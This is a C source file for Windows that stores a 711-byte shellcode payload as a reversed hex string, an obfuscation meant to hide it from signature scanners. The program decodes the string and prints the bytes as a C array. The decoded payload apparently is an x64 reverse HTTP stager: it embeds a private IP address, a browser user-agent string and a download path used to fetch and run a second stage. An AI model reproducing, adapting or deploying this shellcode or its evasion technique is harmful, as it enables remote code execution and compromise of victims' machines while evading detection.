#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(void) {
	

	char reversed_hex_string[] = "5dx0,ffx0,65x0,2ax0,5bx0,0fx0,2cx0,7cx0,94x0,95x0,0x0,a6x0,85x0,3cx0,85x0,2dx0,57x0,0cx0,58x0,3cx0,1x0,84x0,7x0,b8x0,66x0,2bx0,47x0,0cx0,58x0,02x0,4cx0,38x0,84x0,5dx0,ffx0,0x0,0x0,0x0,0x0,2ex0,98x0,69x0,21x0,abx0,94x0,9fx0,98x0,94x0,0x0,0x0,02x0,0x0,0cx0,7cx0,94x0,adx0,98x0,84x0,1fx0,98x0,84x0,7ex0,98x0,84x0,35x0,35x0,39x0,84x0,5dx0,ffx0,0x0,0x0,0x0,0x0,5ex0,35x0,4ax0,85x0,abx0,94x0,0x0,0x0,01x0,0x0,0cx0,7cx0,94x0,01x0,2ex0,1cx0,1dx0,98x0,94x0,a5x0,04x0,a6x0,95x0,35x0,0x0,0x0,0x0,55x0,8ex0,ccx0,bex0,2x0,47x0,fcx0,ffx0,84x0,5dx0,ffx0,0x0,0x0,0x0,0x0,0ex0,53x0,0fx0,44x0,abx0,94x0,0x0,0x0,31x0,88x0,1cx0,7cx0,84x0,f1x0,57x0,0cx0,58x0,5dx0,ffx0,b7x0,81x0,6x0,d2x0,2cx0,7cx0,94x0,35x0,35x0,9cx0,13x0,d4x0,9cx0,13x0,d4x0,1fx0,98x0,84x0,a5x0,35x0,f5x0,ax0,a6x0,6cx0,98x0,84x0,5dx0,ffx0,b3x0,e2x0,55x0,bex0,2cx0,7cx0,94x0,35x0,35x0,05x0,0x0,0x0,0x0,0x0,48x0,82x0,2x0,0x0,8bx0,84x0,35x0,9cx0,13x0,d4x0,85x0,14x0,a5x0,35x0,1cx0,98x0,84x0,0x0,d2x0,57x0,87x0,67x0,17x0,e6x0,f4x0,a4x0,45x0,14x0,96x0,25x0,13x0,26x0,65x0,17x0,53x0,85x0,14x0,15x0,47x0,26x0,64x0,93x0,93x0,47x0,05x0,44x0,66x0,85x0,a6x0,c6x0,13x0,56x0,47x0,d4x0,35x0,23x0,24x0,16x0,74x0,f5x0,73x0,83x0,43x0,b6x0,96x0,e6x0,c6x0,f5x0,a6x0,77x0,05x0,24x0,14x0,37x0,07x0,57x0,f5x0,d4x0,73x0,f4x0,a7x0,d6x0,36x0,27x0,e4x0,25x0,95x0,96x0,44x0,77x0,57x0,f2x0,0x0,0x0,0x0,b4x0,8ex0,5dx0,ffx0,0x0,0x0,0x0,0x0,6cx0,f9x0,98x0,75x0,abx0,94x0,35x0,3x0,a6x0,35x0,35x0,9cx0,13x0,d4x0,0x0,0x0,0x0,05x0,0cx0,7cx0,94x0,1cx0,98x0,84x0,a5x0,0x0,43x0,33x0,13x0,e2x0,03x0,93x0,13x0,e2x0,83x0,63x0,13x0,e2x0,23x0,93x0,13x0,0x0,0x0,0x0,01x0,8ex0,5dx0,ffx0,0x0,0x0,0x0,0x0,7ax0,97x0,65x0,a3x0,abx0,94x0,35x0,35x0,9cx0,13x0,d4x0,0cx0,13x0,d4x0,a5x0,35x0,95x0,0x0,63x0,33x0,e2x0,73x0,33x0,53x0,f2x0,96x0,27x0,16x0,66x0,16x0,35x0,02x0,03x0,e2x0,03x0,e2x0,03x0,e2x0,13x0,33x0,13x0,f2x0,56x0,d6x0,f6x0,27x0,86x0,34x0,02x0,92x0,f6x0,b6x0,36x0,56x0,74x0,02x0,56x0,b6x0,96x0,c6x0,02x0,c2x0,c4x0,d4x0,45x0,84x0,b4x0,82x0,02x0,63x0,33x0,e2x0,73x0,33x0,53x0,f2x0,47x0,96x0,b4x0,26x0,56x0,75x0,56x0,c6x0,07x0,07x0,14x0,02x0,92x0,43x0,63x0,87x0,02x0,b3x0,43x0,63x0,e6x0,96x0,75x0,02x0,b3x0,03x0,e2x0,03x0,13x0,02x0,45x0,e4x0,02x0,37x0,77x0,f6x0,46x0,e6x0,96x0,75x0,82x0,02x0,03x0,e2x0,53x0,f2x0,16x0,c6x0,c6x0,96x0,a7x0,f6x0,d4x0,0x0,0x0,0x0,07x0,8ex0,35x0,35x0,5dx0,ffx0,7x0,62x0,77x0,c4x0,2cx0,7cx0,94x0,1ex0,98x0,84x0,65x0,14x0,0x0,47x0,56x0,e6x0,96x0,e6x0,96x0,77x0,ebx0,94x0,35x0,bdx0,13x0,84x0,d5x0,ffx0,ffx0,ffx0,b4x0,9ex0,21x0,b8x0,84x0,a5x0,95x0,14x0,85x0,0ex0,ffx0,25x0,14x0,02x0,cex0,38x0,84x0,a5x0,14x0,95x0,14x0,85x0,14x0,a5x0,95x0,e5x0,0dx0,1x0,84x0,85x0,14x0,85x0,14x0,88x0,4x0,b8x0,14x0,0dx0,1x0,94x0,c1x0,04x0,b8x0,44x0,84x0,cx0,b8x0,14x0,66x0,0dx0,1x0,94x0,42x0,04x0,b8x0,44x0,85x0,8dx0,57x0,1dx0,93x0,54x0,8x0,42x0,c4x0,3x0,c4x0,1fx0,57x0,0ex0,83x0,1cx0,1x0,14x0,dx0,9cx0,1cx0,14x0,cax0,0cx0,13x0,84x0,6dx0,1x0,84x0,9cx0,13x0,d4x0,88x0,43x0,b8x0,14x0,9cx0,ffx0,84x0,65x0,3ex0,05x0,81x0,84x0,b8x0,0dx0,1x0,94x0,02x0,04x0,b8x0,44x0,0dx0,1x0,84x0,76x0,47x0,0cx0,58x0,84x0,0x0,0x0,0x0,88x0,08x0,b8x0,0x0,0x0,0x0,27x0,58x0,fx0,2x0,bx0,81x0,87x0,18x0,66x0,0dx0,1x0,84x0,15x0,14x0,c3x0,24x0,b8x0,02x0,25x0,b8x0,84x0,25x0,dex0,2ex0,1cx0,1x0,14x0,dx0,9cx0,1cx0,14x0,02x0,c2x0,2x0,c7x0,16x0,c3x0,cax0,0cx0,13x0,84x0,9cx0,13x0,d4x0,05x0,27x0,b8x0,84x0,a4x0,a4x0,7bx0,fx0,84x0,65x0,15x0,02x0,25x0,b8x0,84x0,81x0,25x0,b8x0,84x0,06x0,25x0,b8x0,84x0,56x0,2dx0,13x0,84x0,25x0,05x0,14x0,15x0,14x0,0x0,0x0,0x0,ccx0,8ex0,0fx0,4ex0,38x0,84x0,cfx0";
unsigned int shellcode_len = 711;


	// reverse the string
	char* hex_string = _strrev(reversed_hex_string);
	printf("Reversed hex string: %s\n", hex_string);

	// declare a new shellcode byte array
	char shellcode[sizeof(reversed_hex_string)] = { 0 };
	
	// define an index to keep track of where we're at
	int idx = 0;
	int count = 0;
	const int MAX_TOKENS = sizeof(reversed_hex_string);
	char* next_token = NULL;
	char* token = strtok_s(hex_string, ",", &next_token);
	while (token != NULL && count < MAX_TOKENS) {
		shellcode[count++] = strtol(token, NULL, 16);
		token = strtok_s(NULL, ",", &next_token);
	}

	idx = 0;
	while ( idx < shellcode_len)
	{
		if (idx == (shellcode_len - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}

    return 0;
	
}

